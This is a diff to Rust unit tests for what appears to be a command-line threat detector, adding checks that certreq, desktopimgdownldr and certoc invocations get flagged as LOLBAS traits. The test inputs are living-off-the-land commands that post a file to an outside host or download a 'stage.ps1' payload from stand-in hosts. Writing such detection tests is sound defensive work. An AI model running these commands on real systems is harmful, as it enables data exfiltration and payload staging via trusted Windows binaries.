@@ -6531,10 +6531,8 @@ mod misc_handler_tests {
     #[test]
     fn certreq_config_url_emits_typed_trait() {
         let mut env = Environment::new(&Config::default());
-        interpret_line(
-            r#"certreq -Post -config "https://certreq-direct.example/submit" request.req response.txt"#,
-            &mut env,
-        );
+        let raw = r#"certreq -Post -config "https://certreq-direct.example/submit" request.req response.txt"#;
+        interpret_line(raw, &mut env);
         let has = env.traits.iter().any(|t| {
             matches!(
                 t,
@@ -6543,6 +6541,13 @@ mod misc_handler_tests {
             )
         });
         assert!(has, "certreq config URL not typed: {:?}", env.traits);
+        assert!(
+            env.traits.iter().any(
+                |t| matches!(t, Trait::Lolbas { name, cmd } if name == "certreq" && cmd == raw)
+            ),
+            "certreq config URL not marked as LOLBAS: {:?}",
+            env.traits
+        );
     }
 
     #[test]
@@ -6569,10 +6574,8 @@ mod misc_handler_tests {
     #[test]
     fn desktopimgdownldr_lockscreenurl_emits_download() {
         let mut env = Environment::new(&Config::default());
-        interpret_line(
-            r#"desktopimgdownldr.exe /lockscreenurl:https://desktopimg.example/a.jpg /eventName:test"#,
-            &mut env,
-        );
+        let raw = r#"desktopimgdownldr.exe /lockscreenurl:https://desktopimg.example/a.jpg /eventName:test"#;
+        interpret_line(raw, &mut env);
         let has = env.traits.iter().any(|t| {
             matches!(
                 t,
@@ -6583,6 +6586,13 @@ mod misc_handler_tests {
         assert!(
             has,
             "desktopimgdownldr lockscreen URL not typed: {:?}",
+            env.traits
+        );
+        assert!(
+            env.traits
+                .iter()
+                .any(|t| matches!(t, Trait::Lolbas { name, cmd } if name == "desktopimgdownldr" && cmd == raw)),
+            "desktopimgdownldr lockscreen URL not marked as LOLBAS: {:?}",
             env.traits
         );
     }
@@ -6611,10 +6621,8 @@ mod misc_handler_tests {
     #[test]
     fn certoc_getcacaps_url_emits_download() {
         let mut env = Environment::new(&Config::default());
-        interpret_line(
-            r#"certoc.exe -GetCACAPS "https://certoc-direct.example/stage.ps1""#,
-            &mut env,
-        );
+        let raw = r#"certoc.exe -GetCACAPS "https://certoc-direct.example/stage.ps1""#;
+        interpret_line(raw, &mut env);
         let has = env.traits.iter().any(|t| {
             matches!(
                 t,
@@ -6623,6 +6631,13 @@ mod misc_handler_tests {
             )
         });
         assert!(has, "certoc GetCACAPS URL not typed: {:?}", env.traits);
+        assert!(
+            env.traits.iter().any(
+                |t| matches!(t, Trait::Lolbas { name, cmd } if name == "certoc" && cmd == raw)
+            ),
+            "certoc GetCACAPS URL not marked as LOLBAS: {:?}",
+            env.traits
+        );
     }
 
     #[test]
